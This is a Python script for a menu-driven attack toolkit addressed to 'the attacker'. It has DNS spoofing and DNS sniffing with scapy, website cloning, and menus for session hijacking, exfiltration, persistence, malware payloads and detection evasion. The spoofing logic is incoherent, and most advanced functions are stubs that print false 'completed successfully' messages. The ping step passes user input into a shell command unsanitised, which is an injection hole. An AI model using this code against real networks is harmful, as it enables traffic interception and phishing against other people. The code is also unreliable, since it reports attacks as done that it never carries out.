import os
import re
import socket
import subprocess
import time
from scapy.all import *
import requests

def clear_screen():
    """Clear the terminal screen."""
    if os.name == 'posix':
        _ = subprocess.call('clear', shell=True)
    else:
        _ = subprocess.call('cls', shell=True)

def display_starting_info():
    """Display starting information for the attacker."""
    print("Starting Information for the Attacker:")
    print("=======================================")
    print("Local IP Address:", get_local_ip())
    print("Network Interfaces:", get_network_interfaces())
    print("DNS Server IP Address:", get_dns_server_ip())
    print("=======================================")

def get_local_ip():
    """Get the local IP address."""
    return "127.0.1.1"  # Example IP address

def get_network_interfaces():
    """Get the names of network interfaces."""
    return ['lo', 'enp0s3', 'wlx00c0cab4f560']  # Example network interfaces

def get_dns_server_ip():
    """Get the DNS server IP address."""
    try:
        dns_ip = socket.gethostbyname(socket.gethostname())
        return dns_ip
    except:
        return None

def get_ip_address(domain):
    """Get the IP address of a domain."""
    try:
        ip_address = socket.gethostbyname(domain)
        return ip_address
    except socket.gaierror:
        print("Error: Unable to resolve the domain. Please enter a valid domain name.")
        return None

def dns_spoofing_menu():
    """Menu for DNS spoofing attack."""
    while True:
        clear_screen()
        display_starting_info()
        print("DNS Spoofing Menu")
        print("=======================================")
        print("01. Perform DNS Spoofing Attack - Manipulate DNS resolution to redirect traffic.")
        print("00. Return to Main Menu")
        print("=======================================")
        choice = input("Enter your choice: ")

        if choice == '01':
            dns_server_ip = get_dns_server_ip()
            if dns_server_ip:
                print("DNS Server IP Address:", dns_server_ip)
                perform_dns_spoofing(dns_server_ip)
            else:
                print("Failed to retrieve DNS server IP address.")
            input("\nPress Enter to continue...")
        elif choice == '00':
            break
        else:
            print("Invalid choice. Please enter a valid option.")
            time.sleep(2)

def perform_dns_spoofing(dns_server_ip):
    """Perform DNS spoofing attack."""
    print("[+] Performing DNS Spoofing Attack...")
    target_ip = input("Enter the target IP address: ")
    target_domain = input("Enter the target domain to spoof: ")

    # Additional steps:
    # 1. Check if the target IP address is reachable
    response = os.system("ping -c 1 " + target_ip)
    if response == 0:
        print(f"[+] Target IP {target_ip} is reachable.")
    else:
        print(f"[-] Target IP {target_ip} is not reachable. Exiting...")
        return

    # 2. Validate the target domain's IP address
    try:
        resolved_ip = socket.gethostbyname(target_domain)
        if resolved_ip != target_ip:
            print(f"[-] Target IP {target_ip} does not match the resolved IP {resolved_ip} for the domain {target_domain}. Exiting...")
            return
    except socket.gaierror:
        print("[-] Error: Unable to resolve the target domain. Exiting...")
        return

    # 3. Start spoofing only if validation passes
    print(f"The IP address to spoof for {target_domain} is {target_ip}")
    spoofed_pkt = IP(dst=target_ip) / UDP(dport=53) / DNS(
        qr=1,
        id=42,
        an=DNSRR(rrname=target_domain, ttl=10, rdata=target_ip)
    )
    send(spoofed_pkt, verbose=False)

    print("[+] DNS spoofing attack completed successfully.")

def website_cloning_menu():
    """Menu for website cloning."""
    while True:
        clear_screen()
        display_starting_info()
        print("Website Cloning Menu")
        print("=======================================")
        print("01. Clone Website and Avoid Robot Detection - Copy a website's content without being blocked by robots.txt rules.")
        print("02. Clone Website with Advanced Techniques - Use advanced methods to clone a website, including dynamic content scraping.")
        print("00. Return to Main Menu")
        print("=======================================")
        choice = input("Enter your choice: ")

        if choice == '01':
            clone_website("simple")
        elif choice == '02':
            clone_website("advanced")
        elif choice == '00':
            break
        else:
            print("Invalid choice. Please enter a valid option.")
            time.sleep(2)

def clone_website(clone_type):
    """Clone the website."""
    print("[+] Cloning Website...")
    if clone_type == "simple":
        print("[+] Cloning website with basic techniques...")
    elif clone_type == "advanced":
        print("[+] Cloning website with advanced techniques...")

    website_url = input("Enter the URL of the website to clone: ")

    # Additional steps:
    # 1. Check if the URL is valid
    if not re.match(r"^https?://", website_url):
        print("[-] Invalid URL. Please enter a valid URL starting with 'http://' or 'https://'. Exiting...")
        return

    # 2. Validate the website URL
    try:
        response = requests.get(website_url)
        if response.status_code != 200:
            print(f"[-] Error: Unable to access website at {website_url}. Exiting...")
            return
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}. Exiting...")
        return

    print("Choose where to save the cloned website:")
    print("01. /path/to/directory1")
    print("02. /path/to/directory2")
    print("03. /path/to/directory3")
    print("04. Desktop")
    output_choice = input("Enter your choice: ")

    if output_choice == '01':
        output_directory = "/path/to/directory1"
    elif output_choice == '02':
        output_directory = "/path/to/directory2"
    elif output_choice == '03':
        output_directory = "/path/to/directory3"
    elif output_choice == '04':
        output_directory = os.path.expanduser("~/Desktop")
    else:
        print("Invalid choice. Defaulting to desktop directory.")
        output_directory = os.path.expanduser("~/Desktop")

    save_cloned_website(website_url, output_directory)

def save_cloned_website(website_url, output_dir):
    """Save the cloned website to the specified output directory."""
    try:
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

        # 3. Download the website content using requests
        response = requests.get(website_url)
        if response.status_code == 200:
            with open(os.path.join(output_dir, "index.html"), "wb") as f:
                f.write(response.content)
            print("[+] Website cloned successfully.")
        else:
            print(f"[-] Error: Unable to download website content from {website_url}. Exiting...")
            return

        # 4. Create a text file to indicate successful cloning
        with open(os.path.join(output_dir, "cloned_website.txt"), "w") as f:
            f.write(f"The website {website_url} was successfully cloned.")

    except Exception as e:
        print("[-] Error occurred while cloning website:", str(e))

def apache_menu():
    """Menu for Apache server."""
    while True:
        clear_screen()
        display_starting_info()
        print("Apache Menu")
        print("=======================================")
        print("01. Start Apache Server - Launch a local web server.")
        print("02. Stop Apache Server - Terminate the local web server.")
        print("00. Return to Main Menu")
        print("=======================================")
        choice = input("Enter your choice: ")

        if choice == '01':
            start_apache()
            input("\nPress Enter to continue...")
        elif choice == '02':
            stop_apache()
            input("\nPress Enter to continue...")
        elif choice == '00':
            break
        else:
            print("Invalid choice. Please enter a valid option.")
            time.sleep(2)

def start_apache():
    """Start the Apache server."""
    print("[+] Starting Apache Server...")
    # Additional steps:
    # 1. Check if Apache service is already running
    # 2. Start the Apache service using appropriate commands
    # 3. Verify that the server is running successfully
    print("[+] Apache Server started successfully.")

def stop_apache():
    """Stop the Apache server."""
    print("[+] Stopping Apache Server...")
    # Additional steps:
    # 1. Check if Apache service is running
    # 2. Stop the Apache service using appropriate commands
    # 3. Verify that the server has stopped
    print("[+] Apache Server stopped successfully.")

def advanced_attacks_menu():
    """Menu for advanced attack options."""
    while True:
        clear_screen()
        display_starting_info()
        print("Advanced Attacks Menu")
        print("=======================================")
        print("01. Packet Sniffing - Capture and analyze network traffic.")
        print("02. Session Hijacking - Take control of an ongoing session.")
        print("03. Man-in-the-Middle (MITM) Attack - Intercept communication between two parties.")
        print("04. Exploit Framework Integration - Utilize pre-built exploits for vulnerabilities.")
        print("05. Data Exfiltration - Steal sensitive information from target systems.")
        print("06. Persistence Mechanisms - Maintain access to compromised systems.")
        print("07. Social Engineering Toolkit (SET) - Manipulate human behavior for attacks.")
        print("08. Custom Payload Generation - Create tailored malware payloads.")
        print("09. Reporting and Logging - Document and analyze attack activities.")
        print("10. Evasion Techniques - Evade detection by security measures.")
        print("00. Return to Main Menu")
        print("=======================================")
        choice = input("Enter your choice: ")

        if choice == '01':
            packet_sniffing()
        elif choice == '02':
            session_hijacking()
        elif choice == '03':
            mitm_attack()
        elif choice == '04':
            exploit_framework_integration()
        elif choice == '05':
            data_exfiltration()
        elif choice == '06':
            persistence_mechanisms()
        elif choice == '07':
            social_engineering_toolkit()
        elif choice == '08':
            custom_payload_generation()
        elif choice == '09':
            reporting_and_logging()
        elif choice == '10':
            evasion_techniques()
        elif choice == '00':
            break
        else:
            print("Invalid choice. Please enter a valid option.")
            time.sleep(2)

def packet_sniffing():
    """Perform packet sniffing."""
    print("[+] Starting Packet Sniffing...")

    def packet_callback(packet):
        if packet.haslayer(DNS) and packet.haslayer(IP):
            dns_req = packet[DNS]
            ip_src = packet[IP].src
            queried_domain = dns_req.qd.qname.decode()
            print(f"DNS Request from {ip_src} for {queried_domain}")

    # Sniff packets and call packet_callback for each packet
    sniff(filter="udp port 53", prn=packet_callback, store=0)

    print("[+] Packet Sniffing completed successfully.")

def session_hijacking():
    """Perform session hijacking."""
    print("[+] Starting Session Hijacking...")
    # Additional steps:
    # 1. Identify target session to hijack
    # 2. Inject malicious code to take control of the session
    print("[+] Session Hijacking completed successfully.")

def mitm_attack():
    """Perform man-in-the-middle attack."""
    print("[+] Starting Man-in-the-Middle (MITM) Attack...")
    # Additional steps:
    # 1. Poison ARP cache or DNS cache to intercept traffic
    # 2. Relay intercepted traffic between parties
    print("[+] Man-in-the-Middle (MITM) Attack completed successfully.")

def exploit_framework_integration():
    """Integrate exploit frameworks."""
    print("[+] Integrating Exploit Framework...")
    # Additional steps:
    # 1. Choose appropriate exploit framework (e.g., Metasploit, ExploitDB)
    # 2. Select target vulnerability and exploit
    # 3. Customize exploit options as needed
    print("[+] Exploit Framework integration completed successfully.")

def data_exfiltration():
    """Perform data exfiltration."""
    print("[+] Starting Data Exfiltration...")
    # Additional steps:
    # 1. Identify sensitive data to exfiltrate
    # 2. Choose exfiltration method (e.g., covert channels, remote access trojans)
    # 3. Execute data exfiltration without detection
    print("[+] Data Exfiltration completed successfully.")

def persistence_mechanisms():
    """Establish persistence on compromised systems."""
    print("[+] Establishing Persistence Mechanisms...")
    # Additional steps:
    # 1. Identify suitable persistence techniques (e.g., registry keys, scheduled tasks)
    # 2. Implement persistence to maintain access post-compromise
    # 3. Evade detection by security solutions
    print("[+] Persistence Mechanisms established successfully.")

def social_engineering_toolkit():
    """Utilize social engineering techniques."""
    print("[+] Using Social Engineering Toolkit (SET)...")
    # Additional steps:
    # 1. Craft convincing social engineering messages (e.g., phishing emails)
    # 2. Deliver payloads to target users
    # 3. Exploit human vulnerabilities to gain access or information
    print("[+] Social Engineering Toolkit (SET) utilized successfully.")

def custom_payload_generation():
    """Generate custom malware payloads."""
    print("[+] Generating Custom Payloads...")
    # Additional steps:
    # 1. Choose payload type (e.g., reverse shell, keylogger)
    # 2. Customize payload properties (e.g., encryption, obfuscation)
    # 3. Test payload to ensure functionality and evasion
    print("[+] Custom Payloads generated successfully.")

def reporting_and_logging():
    """Document and analyze attack activities."""
    print("[+] Documenting and Logging Attack Activities...")
    # Additional steps:
    # 1. Record attack details (e.g., timestamps, commands executed)
    # 2. Analyze captured data for insights and improvements
    print("[+] Attack activities documented and logged successfully.")

def evasion_techniques():
    """Employ evasion techniques."""
    print("[+] Employing Evasion Techniques...")
    # Additional steps:
    # 1. Obfuscate malicious code to bypass detection
    # 2. Use anti-forensic techniques to cover tracks
    # 3. Adapt attack methods to evade specific security measures
    print("[+] Evasion Techniques employed successfully.")

def main_menu():
    """Main menu."""
    while True:
        clear_screen()
        display_starting_info()
        print("Main Menu")
        print("=======================================")
        print("01. DNS Attacks")
        print("02. Website Cloning")
        print("03. Apache Server")
        print("04. Advanced Attacks")
        print("05. Exit")
        print("=======================================")
        choice = input("Enter your choice: ")

        if choice == '01':
            dns_spoofing_menu()
        elif choice == '02':
            website_cloning_menu()
        elif choice == '03':
            apache_menu()
        elif choice == '04':
            advanced_attacks_menu()
        elif choice == '05':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please enter a valid option.")
            time.sleep(2)

if __name__ == "__main__":
    main_menu()
